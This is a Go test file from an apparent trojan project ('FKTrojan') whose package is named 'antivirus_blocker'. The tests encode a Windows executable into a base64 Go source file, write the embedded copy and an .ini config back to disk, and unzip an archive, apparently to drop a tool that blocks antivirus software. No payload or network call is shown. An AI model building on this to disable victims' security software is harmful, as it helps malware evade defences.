package antivirus_blocker

import (
	"FKTrojan/common"
	"bytes"
	"encoding/base64"
	"io/ioutil"
	"testing"
)

func TestGetZipBase64Code(t *testing.T) {
	file := "d:/bin/winanvir.exe"
	b, err := ioutil.ReadFile(file)
	if err != nil {
		t.Fatalf("read file %s error %v", file, err)
	}
	var buf bytes.Buffer
	err = gzipWrite(&buf, []byte(b))
	if err != nil {
		t.Fatal(err)
	}
	str := base64.StdEncoding.EncodeToString(buf.Bytes())

	ioutil.WriteFile("d:/bin/winanvir_exe_dat.go", []byte(str), 0666)
}

func TestSaveWinAnvirExe(t *testing.T) {
	src := "d:/bin/winanvir.exe"
	dst := "d:/bin/abc.exe"
	err := saveWinAnvirExe(dst)
	if err != nil {
		t.Fatalf("save error %v", err)
	}
	srcMd5 := common.Md5HashStringFile(src)
	dstMd5 := common.Md5HashStringFile(dst)
	if srcMd5 == "" {
		t.Fatalf("src md5 get error")
	}
	if dstMd5 == "" {
		t.Fatalf("dst md5 get error")
	}
	if srcMd5 != dstMd5 {
		t.Fatalf("src md5 %s != %s dst md5", srcMd5, dstMd5)
	}
	t.Log("OK")

}
func TestSaveWinAnvirIni(t *testing.T) {
	dst := "d:/bin/abc.ini"
	err := saveWinAnvirIni(dst)
	if err != nil {
		t.Fatalf("save error %v", err)
	}
	t.Log("OK")
}

func TestUnZip(t *testing.T) {
	src := "d:/anvir.zip"
	dst := "d:/"
	unzip(src, dst)
}
